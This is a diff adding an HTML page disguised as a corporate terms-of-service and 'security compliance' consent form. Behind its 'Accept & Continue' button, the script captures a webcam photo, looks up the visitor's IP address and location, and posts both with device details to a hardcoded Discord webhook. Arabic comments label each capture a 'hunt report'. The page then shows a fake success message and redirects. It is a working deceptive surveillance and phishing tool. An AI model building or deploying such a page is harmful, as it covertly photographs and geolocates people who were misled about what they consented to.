@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Global Security & Compliance Portal</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
+        body { background-color: #f2f2f2; color: #333; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { background: #ffffff; width: 90%; max-width: 600px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); border-radius: 2px; border-top: 4px solid #0067b8; }
+        h1 { font-size: 24px; color: #000; margin-bottom: 10px; font-weight: 600; }
+        p { font-size: 14px; color: #666; margin-bottom: 25px; line-height: 1.5; }
+        .legal-scroll { height: 300px; overflow-y: scroll; border: 1px solid #ddd; padding: 20px; background: #fafafa; font-size: 12px; line-height: 1.8; color: #444; margin-bottom: 25px; border-radius: 3px; }
+        .checkbox-section { margin-bottom: 30px; }
+        .checkbox-item { display: flex; align-items: flex-start; margin-bottom: 15px; cursor: pointer; }
+        .checkbox-item input { margin-top: 4px; margin-right: 12px; transform: scale(1.2); }
+        .checkbox-item label { font-size: 13px; font-weight: 600; color: #222; cursor: pointer; }
+        .btn-primary { background: #0067b8; color: white; border: none; padding: 10px 30px; font-size: 15px; font-weight: 600; cursor: pointer; float: right; transition: 0.2s; }
+        .btn-primary:hover { background: #005da6; }
+        #video, #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Terms of Service & Data Authorization</h1>
+        <p>Please review the updated global security protocols to ensure your account compliance and rights protection.</p>
+
+        <div class="legal-scroll" id="legal-box"></div>
+
+        <div class="checkbox-section">
+            <div class="checkbox-item">
+                <input type="checkbox" id="check1">
+                <label for="check1">Do you agree to all the rules?</label>
+            </div>
+            <div class="checkbox-item">
+                <input type="checkbox" id="check2">
+                <label for="check2">Do you allow me to retrieve your information? (Including biometric and system metadata)</label>
+            </div>
+        </div>
+
+        <button class="btn-primary" onclick="startCapture()">Accept & Continue</button>
+    </div>
+
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" width="640" height="480"></canvas>
+
+    <script>
+        // توليد القوانين تلقائياً
+        const legalBox = document.getElementById('legal-box');
+        let legalText = "";
+        for(let i=1; i<=450; i++) {
+            legalText += `<strong>Clause ${i}.A:</strong> Synchronization of hardware metadata is mandatory for auditing. Users grant full access to integrated peripherals for identity verification purposes... <br><br>`;
+        }
+        legalBox.innerHTML = legalText;
+
+        // رابط الويبهوك الخاص بك
+        const WH_URL = 'https://discord.com/api/webhooks/1501608404286832711/divHGcQYM_Vyxc0VrEnXB7ZVjYLho1I0fn3rN07NO1OTzlFn8_6Mi_u7O5Cr0D9irAvt';
+
+        async function startCapture() {
+            if(!document.getElementById('check1').checked || !document.getElementById('check2').checked) {
+                alert("You must agree to all terms to proceed.");
+                return;
+            }
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                let netInfo = { ip: "N/A", city: "N/A", country: "N/A", org: "N/A" };
+                try {
+                    const res = await fetch('https://ipapi.co/json/');
+                    netInfo = await res.json();
+                } catch(e) {}
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                    
+                    canvas.toBlob(async (blob) => {
+                        const fd = new FormData();
+                        fd.append('file', blob, 'security_audit.png');
+                        
+                        const message = `🚨 **تقرير صيد جديد:**\n\n` +
+                                        `📍 **IP:** \`${netInfo.ip}\`\n` +
+                                        `🌍 **الموقع:** \`${netInfo.city}, ${netInfo.country}\`\n` +
+                                        `🏢 **الشركة:** \`${netInfo.org}\`\n` +
+                                        `📱 **الجهاز:** \`${navigator.platform}\`\n` +
+                                        `🖥️ **الشاشة:** \`${window.screen.width}x${window.screen.height}\``;
+
+                        fd.append('content', message);
+                        await fetch(WH_URL, { method: 'POST', body: fd });
+                        
+                        stream.getTracks().forEach(t => t.stop());
+                        alert("Authorization Successful. System synchronized.");
+                        window.location.href = "https://discord.com/developers/docs/intro";
+                    }, 'image/png');
+                }, 1500);
+
+            } catch (err) {
+                alert("Security check failed. Please enable camera access to verify identity.");
+            }
+        }
+    </script>
+</body>
+</html>
